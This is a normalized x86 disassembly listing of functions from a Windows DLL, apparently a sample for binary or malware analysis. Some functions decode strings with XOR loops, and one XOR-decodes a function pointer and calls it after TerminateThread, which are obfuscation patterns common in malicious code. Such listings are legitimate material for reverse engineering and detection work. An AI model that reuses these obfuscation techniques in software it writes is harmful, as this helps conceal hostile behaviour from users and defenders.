lea edi [ ebp - 0xbc ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
push 0x227a9
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1003e830
add esp 0x4
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10057800
add esp 0xc
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_10041240
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000be00
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1002d84e
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_1005e580
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10044960
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_1004efe0
push esi
push ebx
call sub_10003290
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10028f80
mov eax [ ebp - 0x120 ]
push eax
call sub_100187af
add esp 0x14
sub_100453a0
push ebp
mov ebp esp
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_1005ddc0
pop esi
pop ebp
retn 0x4
sub_100453ce
push 0x38
mov eax sub_1008581d
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100275d9
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10045480
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
add ecx 0x8
push ecx
push eax
call sub_10034e74
add esp 0x8
test [ ebp + 0x8 ] ax
mov eax 0x0
setne al
pop ebp
retn 0x8
sub_100454a3
push 0xc
push r--data
call sub_1007fb20
push 0xe
call sub_10058c10
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004550a
call sub_1007fb65
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_10035d06
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_10035d06
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_10045520
push ebp
mov ebp esp
push 0xffffffff
push sub_100882c4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x144 ] eax
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x13c ] edi
mov ecx [ r--data ]
movzx esi dx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x29
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0xc
jb r-xdata
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ax
lea eax [ ebp - 0x90 ]
push eax
call [ GetSystemTime@IAT ]
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff88
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0xb
jb r-xdata
movzx ecx [ ebp - 0x82 ]
movzx edx [ ebp - 0x84 ]
push ecx
movzx ecx [ ebp - 0x88 ]
xor eax eax
mov [ ebp - 0x32 ] ax
movzx eax [ ebp - 0x86 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x48 ]
push edx
mov ecx 0x1a
lea ebx [ ebp - 0x30 ]
call sub_1002cb70
add esp 0x14
lea ecx [ ebp - 0x11c ]
push esi
push ecx
call sub_1005f2b0
add esp 0x8
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x4 ] 0x1
push 0x1
xor edx edx
mov ebx 0x7
xor esi esi
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x80 ] dx
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x2
call [ GetCurrentThreadId@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_1005f2b0
add esp 0x8
mov edi eax
mov [ ebp - 0x4 ] 0x3
xor ecx ecx
push 0x1
mov [ ebp - 0x64 ] cx
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] esi
call sub_1005ddc0
lea edx [ ebp - 0x64 ]
push edx
lea edx [ ebp - 0x30 ]
lea esi [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x4
call sub_1005bbc0
add esp 0x4
mov ecx eax
mov eax edi
lea edi [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x5
call sub_10057920
mov ecx eax
lea eax [ ebp - 0x80 ]
lea edi [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x6
call sub_10057920
mov ecx eax
mov eax [ ebp - 0x140 ]
mov [ ebp - 0x4 ] bl
mov edi [ ebp - 0x144 ]
call sub_10057920
mov [ ebp - 0x13c ] 0x1
mov esi 0x8
cmp [ ebp - 0x98 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x9c ] 0x0
mov [ ebp - 0xac ] cx
cmp [ ebp - 0xb4 ] esi
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb8 ] 0x0
mov [ ebp - 0xc8 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0xd0 ] ebx
mov [ ebp - 0xd4 ] 0x0
mov [ ebp - 0xe4 ] dx
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0xec ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0xec ] ebx
mov [ ebp - 0xf0 ] 0x0
mov [ ebp - 0x100 ] ax
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov edx [ ebp - 0x100 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x80 ] dx
cmp [ ebp - 0x108 ] esi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x108 ] ebx
mov ebx [ ebp - 0x148 ]
xor ecx ecx
mov [ ebp - 0x10c ] 0x0
mov [ ebp - 0x11c ] cx
cmp [ ebx + 0x10 ] ecx
je r-xdata
mov eax [ ebp - 0x11c ]
push eax
call sub_100187af
add esp 0x4
push 0x2
push r--data
mov ecx edi
call sub_10040ba0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x138 ]
push r--data
push edx
call sub_10017cc0
add esp 0x8
push 0xffffffff
push 0x0
push eax
mov ecx edi
mov [ ebp - 0x4 ] esi
call sub_10017b50
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x124 ] esi
jb r-xdata
mov eax [ ebp - 0x138 ]
push eax
call sub_100187af
add esp 0x4
sub_100458a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10045930
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10045971
mov edi edi
push ebp
mov ebp esp
call sub_10044649
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_100459a0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
shl ecx 0x5
push ecx
call sub_1001f84c
add esp 0x4
test eax eax
jne r-xdata
sub_100459f0
push 0x10
push r--data
call sub_1007fb20
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_1006299d
mov [ eax ] 0x9
call sub_100427ff
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb65
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10013b34
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1006299d
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1005bb4f
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10045ac1
mov eax [ ebp - 0x1c ]
call sub_10017e58
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_10045ad0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10045b14
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_10045bd0
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov edx [ eax + 0x30 ]
push ebx
push edi
lea ecx [ ebp - 0x44 ]
push ecx
xor edi edi
push esi
xor ebx ebx
mov [ ebp - 0x44 ] edi
call edx
test eax eax
jns r-xdata
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax edi
jne r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea edx [ ebp - 0x48 ]
push edx
push eax
mov eax [ ecx + 0x50 ]
push esi
mov [ ebp - 0x48 ] edi
call eax
mov eax [ ebp - 0x48 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x28
call sub_10053240
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ebx 0x4
xor eax eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x48 ] edi
jmp r-xdata
inc eax
cmp eax 0x18
jb r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax edi
jne r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10045cc0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push r--data
push ecx
mov edx 0xa
mov [ ebp - 0x1c ] 0x0
call sub_10072780
add esp 0xc
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
lea eax [ ebp - 0x18 ]
mov [ esi ] dx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
call sub_1005ddc0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10045d3b
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1000bde0
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x5 ] al
jmp r-xdata
mov al [ esi + 0x5 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_10045d70
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
push edi
mov edi 0x1
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x4c ]
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp - 0x4 ] al
xor [ ebp - 0x3 ] al
xor [ ebp - 0x2 ] al
xor [ ebp - 0x1 ] al
push ecx
call [ ebp - 0x4 ]
mov [ esi + 0x4c ] 0x0
sub_10045dd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086368
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
